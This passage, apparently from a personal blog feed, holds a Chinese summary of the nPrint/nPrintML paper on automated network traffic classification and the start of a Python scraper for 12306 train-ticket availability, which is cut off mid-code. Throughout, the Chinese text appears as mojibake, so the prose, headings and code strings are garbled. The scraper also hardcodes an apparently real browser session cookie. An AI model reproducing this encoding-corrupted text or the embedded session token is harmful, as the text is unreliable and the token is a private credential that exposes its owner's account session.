align="center"><a href="https://dl.acm.org/doi/10.1145/3460120.3484758">https://dl.acm.org/doi/10.1145/3460120.3484758</a></td></tr><tr><td>æºç </td><td align="center"><a href="https://github.com/nprint/nprint"> https://github.com/nprint/nprint</a></td></tr><tr><td>æ•°æ®é›†</td><td align="center"><a href="https://drive.google.com/drive/folders/158Lwb9TwopIJ0lGPuFik5744qPiqrg9F">https://drive.google.com/drive/folders/158Lwb9TwopIJ0lGPuFik5744qPiqrg9F</a></td></tr></tbody></table><h2 id="æ‘˜è¦"><a href="#æ‘˜è¦" class="headerlink" title="æ‘˜è¦"></a>æ‘˜è¦</h2><p>ç›®å‰,æœºå™¨å­¦ä¹ æŠ€æœ¯è¢«å¹¿æ³›åº”ç”¨äºå…¥ä¾µæ£€æµ‹ã€åº”ç”¨ç¨‹åºè¯†åˆ«ç­‰ç½‘ç»œæµé‡åˆ†æä»»åŠ¡ä¸­ã€‚ä½†æ˜¯ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨æœºå™¨å­¦ä¹ æ–¹æ³•æ—¶ï¼Œç‰¹å¾æå–ã€æ¨¡å‹é€‰æ‹©ã€å‚æ•°è°ƒä¼˜ç­‰ä¼—å¤šå› ç´ å†³å®šç€æ¨¡å‹çš„æ€§èƒ½ï¼Œæ¯å½“é¢å¯¹ä¸åŒçš„ç½‘ç»œæµé‡æˆ–æ–°çš„ä»»åŠ¡ï¼Œå°±éœ€è¦ç ”ç©¶äººå‘˜é‡æ–°è€ƒè™‘è°ƒæ•´è¿™äº›é€‰é¡¹ç”šè‡³é‡æ–°å»ºæ¨¡ï¼Œè¿™ä¸ªè°ƒæ•´ç”šè‡³æ˜¯é‡å»ºçš„è¿‡ç¨‹å¾€å¾€éœ€è¦å¤§é‡äººåŠ›æˆæœ¬å’Œä¸“ä¸šçŸ¥è¯†ã€‚å¹¶ä¸”ï¼Œæµé‡æ¨¡å¼ä¼šä¸æ–­çš„å‘ç”Ÿå˜åŒ–ï¼Œä½¿å¾—æ¨¡å‹å’Œäººå·¥æå–çš„ç‰¹å¾è¿‡æ—¶ã€‚å› æ­¤æœ‰å¿…è¦ä¸ºä¸åŒç½‘ç»œæµé‡åˆ›å»ºä¸€ä¸ªé€šç”¨çš„è¡¨ç¤ºï¼Œå¯ä»¥ç”¨äºå„ç§ä¸åŒçš„æ¨¡å‹ï¼Œè·¨è¶Šå¹¿æ³›çš„é—®é¢˜ç±»ï¼Œå¹¶å°†æ•´ä¸ªå»ºæ¨¡è¿‡ç¨‹è‡ªåŠ¨åŒ–ã€‚è¯¥æ–‡å…³æ³¨é€šç”¨çš„è‡ªåŠ¨åŒ–ç½‘ç»œæµé‡åˆ†æé—®é¢˜ï¼Œè‡´åŠ›äºä½¿ç ”ç©¶äººå‘˜å°†æ›´å¤šçš„ç²¾åŠ›ç”¨äºä¼˜åŒ–æ¨¡å‹å’Œç‰¹å¾ä¸Šï¼Œå¹¶æœ‰æ›´å¤šçš„æ—¶é—´åœ¨å®è·µä¸­è§£é‡Šå’Œéƒ¨ç½²æœ€ä½³æ¨¡å‹ã€‚</p><h2 id="è‡ªåŠ¨åŒ–ç½‘ç»œæµé‡åˆ†æ"><a href="#è‡ªåŠ¨åŒ–ç½‘ç»œæµé‡åˆ†æ" class="headerlink" title="è‡ªåŠ¨åŒ–ç½‘ç»œæµé‡åˆ†æ"></a>è‡ªåŠ¨åŒ–ç½‘ç»œæµé‡åˆ†æ</h2><p>æœ¬æ–‡æå‡ºä¸€ç§è‡ªåŠ¨åŒ–æµé‡åˆ†ææ–¹æ³•ï¼ˆnPrintMLï¼‰ï¼Œä½¿æœºå™¨å­¦ä¹ æŠ€æœ¯æ›´å®¹æ˜“åº”ç”¨äºæ›´å¹¿æ³›çš„æµé‡åˆ†æä»»åŠ¡ã€‚nPrintML åŒ…å« nPrint æµé‡è¡¨ç¤ºå’Œ AutoML ä¸¤éƒ¨åˆ†ï¼Œé¦–å…ˆ nPrint é€šè¿‡å¯¹ IP æ•°æ®åŒ…å¤´è¿›è¡Œå¯¹é½å’Œæ‹¼æ¥å½¢æˆç»Ÿä¸€çš„æ•°æ®è¡¨å¾ï¼Œç„¶åä½¿ç”¨ AutoGluon-Tabular æ¡†æ¶è¿›è¡Œè‡ªåŠ¨åŒ–çš„è¿›è¡Œç‰¹å¾æå–ã€æ¨¡å‹æœç´¢å’Œè¶…å‚æ•°ä¼˜åŒ–ã€‚ä½œè€…åœ¨ 8 ä¸ªä¸åŒçš„æµé‡åˆ†æä»»åŠ¡ä¸Šå¯¹ nPrintML è¿›è¡Œè¯„ä¼°ï¼Œéƒ½å–å¾—äº†å¾ˆå¥½çš„æ•ˆæœã€‚</p><h2 id="æ•°æ®è¡¨ç¤º-nPrint"><a href="#æ•°æ®è¡¨ç¤º-nPrint" class="headerlink" title="æ•°æ®è¡¨ç¤º nPrint"></a>æ•°æ®è¡¨ç¤º nPrint</h2><p>å¯¹äºæµé‡åˆ†ç±»é—®é¢˜ï¼Œæ•°æ®è¡¨ç¤ºä¸æ¨¡å‹é€‰æ‹©åŒç­‰é‡è¦ï¼Œæ‰€ä»¥åœ¨åº”ç”¨æœºå™¨å­¦ä¹ æ–¹æ³•æ—¶ï¼Œå¦‚ä½•å¯¹æ•°æ®è¿›è¡Œè¡¨ç¤ºå’Œç¼–ç æ˜¯éå¸¸é‡è¦çš„ä¸€ç¯ã€‚å¯¹äºç½‘ç»œæµé‡æ•°æ®çš„ç¼–ç éœ€è¦æ»¡è¶³ä»¥ä¸‹4ä¸ªè¦æ±‚ï¼š</p><ul><li>å®Œæ•´çš„è¡¨ç¤ºã€‚æˆ‘ä»¬çš„ç›®æ ‡ä¸æ˜¯é€‰æ‹©ç‰¹å®šçš„ç‰¹å¾ï¼Œè€Œæ˜¯ä¸€ç§ç»Ÿä¸€çš„æ•°æ®ç¼–ç ï¼Œä»¥é¿å…ä¾èµ–ä¸“å®¶çŸ¥è¯†ï¼Œæ‰€ä»¥éœ€è¦ä¿ç•™åŒ…å«åŒ…å¤´åœ¨å†…çš„æ‰€æœ‰æ•°æ®åŒ…ä¿¡æ¯ï¼›</li><li>å›ºå®šçš„å¤§å°ã€‚è®¸å¤šæœºå™¨å­¦ä¹ æ¨¡å‹çš„è¾“å…¥æ€»æ˜¯ä¿æŒç›¸åŒçš„å¤§å°ï¼Œæ‰€ä»¥æ¯ä¸ªæ•°æ®åŒ…è¡¨ç¤ºéƒ½å¿…é¡»æ˜¯å¸¸é‡å¤§å°ï¼›</li><li>å›ºæœ‰çš„è§„èŒƒåŒ–ã€‚å½“ç‰¹å¾è¢«å½’ä¸€åŒ–åï¼Œæœºå™¨å­¦ä¹ æ¨¡å‹é€šå¸¸ä¼šè¡¨ç°å¾—æ›´å¥½ï¼Œä¹Ÿèƒ½å‡å°‘è®­ç»ƒæ—¶é—´å¹¶å¢åŠ æ¨¡å‹çš„ç¨³å®šæ€§ï¼Œæ‰€ä»¥å¦‚æœæ•°æ®çš„åˆå§‹è¡¨ç¤ºæœ¬èº«å°±æ˜¯è§„èŒƒåŒ–çš„ï¼Œå°†ä¼šéå¸¸æ–¹ä¾¿ï¼›</li><li>ä¸€è‡´çš„è¡¨ç¤ºã€‚æ•°æ®è¡¨ç¤ºçš„æ¯ä¸ªä½ç½®éƒ½åº”è¯¥å¯¹åº”äºæ‰€æœ‰æ•°æ®åŒ…åŒ…å¤´çš„ç›¸åŒéƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿åè®®å’ŒæŠ¥æ–‡é•¿åº¦ä¸åŒï¼Œç‰¹å®šçš„ç‰¹å¾æ€»æ˜¯åœ¨æ•°æ®åŒ…ä¸­å…·æœ‰ç›¸åŒçš„åç§»é‡ï¼Œå¯¹é½åçš„æ•°æ®éƒ½èƒ½è®©æ¨¡å‹åŸºäºè¿™æ ·çš„å‰ææ¥å­¦ä¹ ç‰¹å¾è¡¨ç¤ºã€‚</li></ul><p>é¦–å…ˆï¼Œæ¥çœ‹ä¸€ä¸‹ä¼ ç»Ÿçš„æµé‡æ•°æ®åŒ…å¤´ã€‚</p><p><img src="https://s2.loli.net/2022/04/06/jIkEbltCHMYh9sR.png" alt="1.png"></p><p>â€‹                                                      å›¾1 è¯­ä¹‰è¡¨ç¤ºæ³•å’Œæœ´ç´ äºŒè¿›åˆ¶è¡¨ç¤ºæ³•</p><p>å¦‚å›¾1æ‰€ç¤ºï¼Œç½‘ç»œæµé‡è¡¨ç¤ºçš„ä¸»è¦æ–¹å¼åŒ…æ‹¬è¯­ä¹‰è¡¨ç¤ºæ³•å’Œæœ´ç´ äºŒè¿›åˆ¶è¡¨ç¤ºæ³•ã€‚</p><ul><li>è¯­ä¹‰è¡¨ç¤ºæ³•ï¼šæ¯ä¸ªæŠ¥å¤´éƒ½æœ‰å„è‡ªçš„è¯­ä¹‰å­—æ®µï¼Œä½†å®ƒä¸ä¿ç•™å…·æœ‰åŒºåˆ†åº¦çš„å¯é€‰å­—æ®µçš„é¡ºåºï¼ŒåŒæ—¶éœ€è¦é¢†åŸŸä¸“ä¸šçŸ¥è¯†æ¥è§£ææ¯ä¸ªåè®®çš„è¯­ä¹‰ç»“æ„ï¼Œå³ä½¿æ‹¥æœ‰è¿™äº›çŸ¥è¯†ï¼Œåç»­ä¹Ÿè¿˜æ˜¯ä¸å¯é¿å…è¿›è¡Œç¹ççš„ç‰¹å¾å·¥ç¨‹ï¼›</li><li>æœ´ç´ äºŒè¿›åˆ¶è¡¨ç¤ºæ³•ï¼šä½¿ç”¨æ•°æ®åŒ…çš„åŸå§‹ä½å›¾è¡¨ç¤ºæ¥ä¿æŒé¡ºåºï¼Œä½†æ˜¯å¿½ç•¥äº†ä¸åŒçš„å¤§å°å’Œåè®®ï¼Œå¯¼è‡´ä¸¤ä¸ªæ•°æ®åŒ…çš„ç‰¹å¾å‘é‡å¯¹åŒä¸€ç‰¹å¾å…·æœ‰ä¸åŒçš„å«ä¹‰ï¼Œè¿™ç§ä¸å¯¹é½å¯èƒ½ä¼šåœ¨é‡è¦ç‰¹å¾çš„åœ°æ–¹å¼•å…¥å™ªå£°è€Œé™ä½æ¨¡å‹æ€§èƒ½ï¼ŒåŒæ—¶ä¹Ÿå› ä¸ºæ— æ³•å°†æ¯ä¸€ä½éƒ½æ˜ å°„åˆ°è¯­ä¹‰ä¸Šè€Œå¯¼è‡´ä¸å¯è§£é‡Šã€‚</li></ul><p>ä»å›¾1ä¸­ä¸éš¾çœ‹å‡ºï¼Œä¸åŒçš„ç½‘ç»œåè®®ï¼ˆå¦‚ TCP å’Œ UDPï¼‰æœ‰ç€ä¸åŒçš„æ•°æ®è¡¨ç¤ºæ–¹æ¡ˆï¼Œç”šè‡³ç›¸åŒçš„ç½‘ç»œåè®®ï¼ˆå¦‚ IPï¼‰ä¹Ÿä¸ç›¸åŒï¼ˆæ˜¯å¦åŒ…å« Options é€‰é¡¹ï¼‰ï¼Œè¿™æ˜¾ç„¶æ— æ³•æ»¡è¶³ä¸Šè¿°ç»Ÿä¸€åŒ–æ•°æ®è¡¨ç¤ºçš„éœ€æ±‚ã€‚å› æ­¤ï¼Œç ”ç©¶äººå‘˜ç»“åˆè¯­ä¹‰è¡¨ç¤ºæ³•å’Œæœ´ç´ äºŒè¿›åˆ¶è¡¨ç¤ºæ³•æå‡ºä¸€ç§ç»Ÿä¸€çš„ç½‘ç»œæ•°æ®åŒ…è¡¨ç¤ºæ–¹æ³•<strong>nPrint</strong>ï¼ˆå›¾ 2ï¼‰ã€‚</p><p><img src="https://s2.loli.net/2022/04/06/wqXfR7yOADHzLxQ.png" alt="2.png"></p><p>â€‹                                                                                    å›¾2 nPrint</p><p>nPrint ä½¿ç”¨æ¯ç§åè®®å…è®¸çš„æœ€å¤§åŒ…å¤´é•¿åº¦æ¥è¡¨ç¤ºè¯¥åè®®ï¼ŒåŒæ—¶å°†ä¸åŒåè®®å¤´éƒ¨æ‹¼æ¥ç»„åˆæˆå›ºå®šé•¿åº¦çš„åŒ…å¤´ã€‚é¦–å…ˆï¼Œå®ƒä¼šä¿è¯ä»»ä½•æ•°æ®åŒ…éƒ½å¯ä»¥è¢«å®Œæ•´è¡¨ç¤ºè€Œä¸ä¸¢å¤±ä»»ä½•ä¿¡æ¯ï¼›ç„¶åï¼Œä½¿ç”¨å†…éƒ¨å¡«å……ç¡®ä¿æ¯ä¸ªæ•°æ®åŒ…ä»¥ç›¸åŒæ•°é‡çš„ç‰¹å¾è¡¨ç¤ºï¼Œå¹¶ä¸”æ¯ä¸ªç‰¹å¾å…·æœ‰ç›¸åŒå«ä¹‰ï¼Œè¿™ç§åœ¨ä½çº§ä¸Šå¯è§£é‡Šçš„è¡¨ç¤ºä½¿æˆ‘ä»¬èƒ½å¤Ÿæ›´å¥½çš„ç†è§£æ¨¡å‹ï¼›å…¶æ¬¡ï¼Œç›´æ¥ä½¿ç”¨æ•°æ®åŒ…çš„ä½ï¼ŒåŒºåˆ†äºæŸä¸ªä½è¢«è®¾ç½®ä¸º0ï¼Œå°†ä¸å­˜åœ¨çš„åŒ…å¤´ç”¨-1å¡«å……ï¼›æœ€åï¼Œæ¯ä¸ªæ•°æ®åŒ…éƒ½ç”¨ç›¸åŒæ•°é‡çš„ç‰¹å¾è¡¨ç¤ºï¼Œå¯¹äºç»™å®šçš„ç½‘ç»œæµé‡åˆ†æä»»åŠ¡ï¼Œå°†è½½è·è®¾ç½®ä¸ºå¯é€‰çš„å­—èŠ‚æ•°ã€‚æ­¤å¤–ï¼ŒnPrintå…·æœ‰æ¨¡å—åŒ–å’Œå¯æ‰©å±•çš„ç‰¹æ€§ï¼Œä¸ä»…å¯ä»¥å°†å…¶ä»–åè®®æ·»åŠ åˆ°è¡¨ç¤ºä¸­ï¼Œä¹Ÿå¯ä»¥å°†ä¸€ç»„æ•°æ®åŒ…è¡¨ç¤ºä¸²è”èµ·æ¥æ„å»ºå¤šåŒ…çš„nPrintæŒ‡çº¹ã€‚</p><p>å› æ­¤ï¼ŒnPrint ç¬¦åˆäº†4å¤§æ€§è´¨ï¼š</p><ul><li>å®Œæ•´æ€§ï¼šç†è®ºä¸Šå¯ä»¥åŒ…å«æ‰€æœ‰åè®®</li><li>ä¸å˜æ€§ï¼šæ•°æ®è¡¨å¾å¯ä»¥æ˜¯ä¸€ä¸ªç¡®å®šçš„é•¿åº¦</li><li>å½’ä¸€æ€§ï¼šæ•°æ®è¢«è¡¨ç¤ºä¸º 1&#x2F;0&#x2F;-1</li><li>ä¸€è‡´æ€§ï¼šä¸åŒæ•°æ®åŒ…å¤´çš„åŒä¸€é€‰é¡¹åœ¨åŒä¸€ä½ç½®</li></ul><h2 id="nPrintML"><a href="#nPrintML" class="headerlink" title="nPrintML"></a>nPrintML</h2><p>ä½œè€…å°† nPrint ä¸ <a href="https://arxiv.org/abs/2003.06505">AutoGluon-Tabular</a> æ¡†æ¶ç›¸ç»“åˆï¼Œæå‡º nPrintMLï¼Œå®ç°äº†å®ç°äº†æœºå™¨å­¦ä¹ æµç¨‹çš„è‡ªåŠ¨åŒ–ï¼ˆå¦‚å›¾3æ‰€ç¤ºï¼‰ã€‚</p><p><img src="https://s2.loli.net/2022/04/06/BqpVTEaQ8eo3gY4.png" alt="3.png"></p><p>â€‹                                                                             å›¾3 nPrintML</p><blockquote><p>AutoGluonèƒŒåæŠ€æœ¯ï¼š<a href="https://www.bilibili.com/video/BV1F84y1F7Ps?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1F84y1F7Ps?spm_id_from=333.999.0.0</a></p><p>AutoGluonåœ¨Windowsä¸‹å®‰è£…ï¼š<a href="https://www.bilibili.com/video/BV1yL4y177hH/?spm_id_from=333.788">https://www.bilibili.com/video/BV1yL4y177hH/?spm_id_from=333.788</a></p><p>è®ºæ–‡ï¼š<a href="https://arxiv.org/abs/2003.06505">https://arxiv.org/abs/2003.06505</a> </p><p>æ–‡æ¡£ï¼š<a href="https://auto.gluon.ai/">https://auto.gluon.ai/</a> </p><p>ä»£ç ï¼š<a href="https://github.com/awslabs/autogluon">https://github.com/awslabs/autogluon</a></p></blockquote><h2 id="å®éªŒç»“æœ"><a href="#å®éªŒç»“æœ" class="headerlink" title="å®éªŒç»“æœ"></a>å®éªŒç»“æœ</h2><h3 id="æ€»è§ˆ"><a href="#æ€»è§ˆ" class="headerlink" title="æ€»è§ˆ"></a>æ€»è§ˆ</h3><p>é’ˆå¯¹8ä¸ªç½‘ç»œæµé‡åˆ†æåœºæ™¯ï¼Œå›¾4å±•ç¤ºäº†ç”¨nPrintMLè¿›è¡Œåˆ†æçš„æ¡ˆä¾‹ç ”ç©¶ï¼Œå®éªŒç»“æœè¡¨æ˜ï¼ŒnPrintMLä¸ä»…å¯ä»¥è§£å†³ä¸åŒåœºæ™¯çš„ç½‘ç»œæµé‡åˆ†æé—®é¢˜ï¼Œå¹¶ä¸”å…·æœ‰ç›¸è¾ƒäºä¼ ç»Ÿæ–¹æ³•æ›´å¥½çš„æ€§èƒ½ã€‚</p><p><img src="https://s2.loli.net/2022/04/06/uA3FM5Z7yNBGqLm.png" alt="4.png"></p><p>â€‹                                                                                  å›¾4 å®éªŒç»“æœæ€»è§ˆ</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å°†æœºå™¨å­¦ä¹ åº”ç”¨äºç½‘ç»œå®‰å…¨ä¸­çš„æµé‡åˆ†æä»»åŠ¡çš„æœ‰æ•ˆæ€§å–å†³äºç‰¹å¾çš„é€‰æ‹©å’Œé€‚å½“çš„è¡¨ç¤ºï¼Œå³ä¸è¶…è¿‡æ¨¡å‹æœ¬èº«ã€‚æœ¬æ–‡ä¸ºè‡ªåŠ¨æµé‡åˆ†æåˆ›å»ºäº†ä¸€ä¸ªæ–°æ–¹å‘ï¼Œæå‡ºäº† nPrintï¼Œè¿™æ˜¯ä¸€ç§ç»Ÿä¸€çš„æ•°æ®åŒ…è¡¨ç¤ºï¼Œå®ƒå°†åŸå§‹ç½‘ç»œæ•°æ®åŒ…ä½œä¸ºè¾“å…¥ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºé€‚åˆè¡¨ç¤ºå­¦ä¹ å’Œæ¨¡å‹è®­ç»ƒçš„æ ¼å¼ï¼Œä»è€Œä½¿æœºå™¨å­¦ä¹ è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†è‡ªåŠ¨åŒ–åˆ°ç›®å‰ä¸ºæ­¢ï¼Œè¿™åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯è‰°è‹¦çš„å’Œæ‰‹åŠ¨çš„ã€‚è¿™ç§æ ‡å‡†æ ¼å¼å¯ä»¥è½»æ¾åœ°å°†ç½‘ç»œæµé‡åˆ†æä¸æœ€å…ˆè¿›çš„è‡ªåŠ¨æœºå™¨å­¦ä¹  (AutoML) ç®¡é“é›†æˆã€‚ nPrintML æ˜¯ nPrint ä¸ AutoML çš„é›†æˆï¼Œå¯è‡ªåŠ¨å­¦ä¹ ç›¸åº”ä»»åŠ¡çš„æœ€ä½³æ¨¡å‹ã€å‚æ•°è®¾ç½®å’Œç‰¹å¾è¡¨ç¤ºã€‚æœ¬æ–‡ä½œè€…ä»¬å°† nPrintML åº”ç”¨äºå…«ç§å¸¸è§çš„ç½‘ç»œæµé‡åˆ†æä»»åŠ¡ï¼Œåœ¨è®¸å¤šæƒ…å†µä¸‹æ”¹è¿›äº†æœ€æ–°æŠ€æœ¯ã€‚ nPrint å·²ç»è¯æ˜ï¼Œè®¸å¤šç½‘ç»œæµé‡åˆ†ç±»ä»»åŠ¡éƒ½å¯ä»¥è‡ªåŠ¨åŒ–ï¼Œå°½ç®¡å­˜åœ¨è®¸å¤šæœªè§£å†³çš„é—®é¢˜ï¼Œä¾‹å¦‚æ¶‰åŠå¤šä¸ªæµçš„è‡ªåŠ¨æ—¶é—´åºåˆ—åˆ†æå’Œåˆ†ç±»ã€‚ nPrint æœ€ç»ˆåº”è¯¥åº”ç”¨äºæ›´å¤§çš„åˆ†ç±»é—®é¢˜é›†ã€‚</p><h2 id="ä»£ç é˜…è¯»åŠå¤ç°"><a href="#ä»£ç é˜…è¯»åŠå¤ç°" class="headerlink" title="ä»£ç é˜…è¯»åŠå¤ç°"></a>ä»£ç é˜…è¯»åŠå¤ç°</h2><p>(è¿‡ä¸¤å¤©å†åšâ€¦â€¦)</p><h2 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h2><p>[1] Nick Erickson, Jonas Mueller, Alexander Shirkov, Hang Zhang, Pedro Larroy, Mu Li, and Alexander Smola. 2020. AutoGluon-Tabular: Robust and Accurate AutoML for Structured Data. arXiv preprint arXiv:2003.06505 (2020).</p><p>[2] Holland J , Schmitt P , Feamster N , et al. New Directions in Automated Traffic Analysis. 2021 ACMComputer and Communications Security Conference [C]. 2021.</p><p>[3] <a href="https://blog.csdn.net/WellShark/article/details/122192656">https://blog.csdn.net/WellShark/article/details/122192656</a></p><p>[4] <a href="https://mp.weixin.qq.com/s/Y8UenzDHP2WjiL3GZ4OLJg">https://mp.weixin.qq.com/s/Y8UenzDHP2WjiL3GZ4OLJg</a></p>]]></content>
      
      
      <categories>
          
          <category> è®ºæ–‡å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> è®ºæ–‡ </tag>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> å…¥ä¾µæ£€æµ‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonçˆ¬è™«</title>
      <link href="/2022/04/06/python-crawler/"/>
      <url>/2022/04/06/python-crawler/</url>
      
        <content type="html"><![CDATA[<h3 id="Pythonçˆ¬è™«å­¦ä¹ "><a href="#Pythonçˆ¬è™«å­¦ä¹ " class="headerlink" title="Pythonçˆ¬è™«å­¦ä¹ "></a>Pythonçˆ¬è™«å­¦ä¹ </h3><p>æ•´ç†äº†ä¸€ä¸‹ä»¥å‰å†™è¿‡çš„ä¸€äº›å°çˆ¬è™«ã€‚</p><h4 id="12306æŸ¥ç¥¨"><a href="#12306æŸ¥ç¥¨" class="headerlink" title="12306æŸ¥ç¥¨"></a>12306æŸ¥ç¥¨</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 12306Check.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># åå¤æŸ¥è¯¢åŠ å¾ªç¯å³å¯</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;stations.json&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">text = f.read()</span><br><span class="line">city_json = json.loads(text)</span><br><span class="line">f.close()</span><br><span class="line">from_station = <span class="built_in">input</span>(<span class="string">&#x27;å§‹å‘ç«™ï¼š&#x27;</span>)</span><br><span class="line">to_station = <span class="built_in">input</span>(<span class="string">&#x27;ç»ˆç‚¹ç«™ï¼š&#x27;</span>)</span><br><span class="line">train_date = <span class="built_in">input</span>(<span class="string">&#x27;å‘è½¦æ—¥æœŸï¼ˆæ ¼å¼ï¼š2022-04-03ï¼‰ï¼š&#x27;</span>)</span><br><span class="line"><span class="comment"># from_station = &#x27;æ­¦æ±‰&#x27;</span></span><br><span class="line"><span class="comment"># to_station = &#x27;é•¿æ²™&#x27;</span></span><br><span class="line"><span class="comment"># train_date = &#x27;2022-04-06&#x27;</span></span><br><span class="line"><span class="comment"># print(city_json[from_station])</span></span><br><span class="line"><span class="comment"># print(city_json[to_station])</span></span><br><span class="line"><span class="comment"># print(train_date)</span></span><br><span class="line">url = <span class="string">&quot;https://kyfw.12306.cn/otn/leftTicket/query&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.train_date&#x27;</span>: train_date,</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.from_station&#x27;</span>: city_json[from_station],</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.to_station&#x27;</span>: city_json[to_station],</span><br><span class="line"><span class="string">&#x27;purpose_codes&#x27;</span>: <span class="string">&#x27;ADULT&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers =&#123;</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;_uab_collina=164896135403377792450208; JSESSIONID=843F9AA2FC700ED2B8E8655CBA8E4AFD; BIGipServerotn=468713994.50210.0000; BIGipServerpool_passport=182714890.50215.0000; highContrastMode=defaltMode; guidesStatus=off; cursorStatus=off; RAIL_EXPIRATION=1649305414970; RAIL_DEVICEID=i7hoNlwMechBKbH0Ghsk6cswUh1nhyGKgfThBDYYiAGy_zBKBevr3wq6zqlS1GV-JvK0B-qVEYwihXSg-WVTUlOcG7NgUJc2INRx-UN6MMxdgg6sumeKjo2NXUwAOlNL7uSajwkmH4Aleee-puGjfAVFL2aVyYMY; route=9036359bb8a8a461c164a04f8f50b252; _jc_save_toStation=%u957F%u6C99%2CCSQ; _jc_save_fromDate=2022-04-03; _jc_save_toDate=2022-04-03; _jc_save_wfdc_flag=dc; _jc_save_fromStation=%u6B66%u6C49%2CWHN&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,params=data,headers=headers)</span><br><span class="line"><span class="comment"># &lt;Response [200]&gt; è·å–å“åº”ä½“å¯¹è±¡</span></span><br><span class="line"><span class="comment"># response.text è·å–å“åº”ä½“çš„æ–‡æœ¬æ•°æ®</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¹±ç æ—¶å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•</span></span><br><span class="line"><span class="comment"># response.encoding = &#x27;utf-8&#x27; #æŒ‡å®šutf-8</span></span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#è‡ªåŠ¨è½¬ç </span></span><br><span class="line">result = response.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;result&#x27;</span>]</span><br><span class="line">lis = []</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> result:</span><br><span class="line">index_list = index.replace(<span class="string">&#x27;æœ‰&#x27;</span>,<span class="string">&#x27;Yes&#x27;</span>).replace(<span class="string">&#x27;æ— &#x27;</span>,<span class="string">&#x27;No&#x27;</span>).split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line"><span class="comment"># index_list = index.split(&#x27;|&#x27;)</span></span><br><span class="line">TrainNum = index_list[<span class="number">3</span>]</span><br><span class="line">StartTime = index_list[<span class="number">8</span>]</span><br><span class="line">EndTime = index_list[<span class="number">9</span>]</span><br><span class="line">UseTime = index_list[<span class="number">10</span>]</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;G&#x27;</span> <span class="keyword">in</span> TrainNum):</span><br><span class="line">BussinessSeats = index_list[<span class="number">32</span>] <span class="comment">#å•†åŠ¡åº§</span></span><br><span class="line">FirstSeats = index_list[<span class="number">31</span>] <span class="comment">#ä¸€ç­‰åº§</span></span><br><span class="line">SecondSeats = index_list[<span class="number">30</span>] <span class="comment">#äºŒç­‰åº§</span></span><br><span class="line">di = &#123;</span><br><span class="line"><span class="string">&#x27;Num&#x27;</span>: TrainNum,</span><br><span class="line"><span class="string">&#x27;Start&#x27;</span>: StartTime,</span><br><span class="line"><span class="string">&#x27;End&#x27;</span>: EndTime,</span><br><span class="line"><span class="string">&quot;Use&quot;</span>: UseTime,</span><br><span class="line"><span class="string">&quot;Top&quot;</span>: BussinessSeats,</span><br><span class="line"><span class="string">&quot;First&quot;</span>: FirstSeats,</span><br><span class="line"><span class="string">&quot;Second&quot;</span>: SecondSeats,</span><br><span class="line"><span class="string">&quot;Soft&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;HBed&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;HSeats&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;NSeats&quot;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">SoftBeds = index_list[<span class="number">23</span>] <span class="comment">#è½¯å§</span></span><br><span class="line">HardBeds = index_list[<span class="number">28</span>] <span class="comment">#ç¡¬å§</span></span><br><span class="line">HardSeats = index_list[<span class="number">29</span>] <span class="comment">#ç¡¬åº§</span></span><br><span class="line">NoSeats = index_list[<span class="number">26</span>] <span class="comment">#æ— åº§</span></span><br><span class="line">di = &#123;</span><br><span class="line"><span class="string">&#x27;Num&#x27;</span>: TrainNum,</span><br><span class="line"><span class="string">&#x27;Start&#x27;</span>: StartTime,</span><br><span class="line"><span class="string">&#x27;End&#x27;</span>: EndTime,</span><br><span class="line"><span class="string">&quot;Use&quot;</span>: UseTime,</span><br><span class="line"><span class="string">&quot;Top&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;First&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;Second&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span 